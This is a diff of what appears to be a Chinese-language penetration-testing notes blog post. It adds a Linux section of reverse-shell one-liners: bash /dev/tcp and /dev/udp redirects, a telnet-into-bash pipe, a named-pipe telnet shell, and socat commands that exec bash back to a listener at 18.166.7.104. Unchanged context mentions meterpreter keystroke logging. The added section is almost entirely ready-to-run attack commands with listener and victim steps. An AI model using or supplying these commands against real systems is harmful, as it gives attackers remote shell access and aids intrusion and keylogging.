@@ -177,7 +177,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      919 字
+      1.2k 字
     </span>
   
 
@@ -187,7 +187,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      17
+      22
        分钟
     </span>
   
@@ -245,6 +245,20 @@
 <p>得到meterpreter的session以后</p>
 <figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">keyscan_start</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">keyscan_dump</span><br></code></pre></div></td></tr></table></figure>
 <p>可以进行键盘记录</p>
+<h1 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h1><h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><h3 id="bash-tcp"><a href="#bash-tcp" class="headerlink" title="bash tcp"></a>bash tcp</h3><p>nc -lnvp 4456<br>bash -i &gt;&amp; /dev/tcp/18.166.7.104/4456 0&gt;&amp;1</p>
+<h3 id="bash2-（失败）"><a href="#bash2-（失败）" class="headerlink" title="bash2 （失败）"></a>bash2 （失败）</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lnvp <span class="hljs-number">4456</span><br><span class="hljs-attribute">exec</span> <span class="hljs-number">5</span>&lt;&gt;/dev/tcp/<span class="hljs-number">18.166.7.104</span>/<span class="hljs-number">4456</span><br><span class="hljs-attribute">cat</span> &lt;&amp;<span class="hljs-number">5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">5</span> &gt;&amp;<span class="hljs-number">5</span>; done<br></code></pre></div></td></tr></table></figure>
+<h3 id="bash-udp（失败）"><a href="#bash-udp（失败）" class="headerlink" title="bash udp（失败）"></a>bash udp（失败）</h3><p>nc -lnvp 4457<br>sh -i &gt;&amp; /dev/udp/18.166.7.104/4457 0&gt;&amp;1</p>
+<h3 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h3><p>victim:</p>
+<p>sh -i &gt;&amp; /dev/udp/192.168.3.253/4242 0&gt;&amp;1</p>
+<p>Centos7:</p>
+<p>csh -i &gt;&amp; /dev/udp/192.168.3.253/4242 0&gt;&amp;1</p>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><h3 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -n -vv -l -p <span class="hljs-number">8080</span> <br><span class="hljs-attribute">nc</span> -n -vv -l -p <span class="hljs-number">8081</span><br><span class="hljs-attribute">Victim</span> <br><span class="hljs-attribute">telnet</span> <span class="hljs-number">18.166.7.104</span>  <span class="hljs-number">8080</span> | /bin/bash | telnet <span class="hljs-number">18.166.7.104</span>  <span class="hljs-number">8081</span><br></code></pre></div></td></tr></table></figure>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">nc -lnvp <span class="hljs-number">4456</span><br>rm -f <span class="hljs-regexp">/tmp/</span>p; mknod <span class="hljs-regexp">/tmp/</span>p p &amp;&amp; telnet <span class="hljs-number">18.166</span>.<span class="hljs-number">7.104</span> <span class="hljs-number">4456</span> <span class="hljs-number">0</span><span class="hljs-regexp">/tmp/</span>p<br></code></pre></div></td></tr></table></figure>
+<h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><h3 id="建立连接-1"><a href="#建立连接-1" class="headerlink" title="建立连接"></a>建立连接</h3><p>目标机器监听：<br>socat TCP4-listen:4433 STDOUT</p>
+<p>本地连接目标机器：<br>socat - TCP4:18.166.7.104:4433</p>
+<h3 id="反弹shell-1"><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>vps(18.166.7.104)上监听：<br>socat -d -d TCP4-LISTEN:4434 STDOUT</p>
+<p>本地kali将shell发送到vps<br>（内网机器运行）socat TCP4:18.166.7.104:4434 EXEC:/bin/bash</p>
+<h3 id="反弹shell-二"><a href="#反弹shell-二" class="headerlink" title="反弹shell 二"></a>反弹shell 二</h3><figure class="highlight perl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs perl">（<span class="hljs-number">18.166</span>.<span class="hljs-number">7.104</span>公网机器运行）socat TCP4-<span class="hljs-keyword">listen</span>:<span class="hljs-number">4435</span> STDOUT<br>（内网机器运行）socat <span class="hljs-keyword">exec</span>:<span class="hljs-string">&#x27;bash -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">18.166</span>.<span class="hljs-number">7.104</span>:<span class="hljs-number">4435</span><br></code></pre></div></td></tr></table></figure>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/jjs/#reverse-shell">https://gtfobins.github.io/gtfobins/jjs/#reverse-shell</a></li>
 <li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python</a></li>
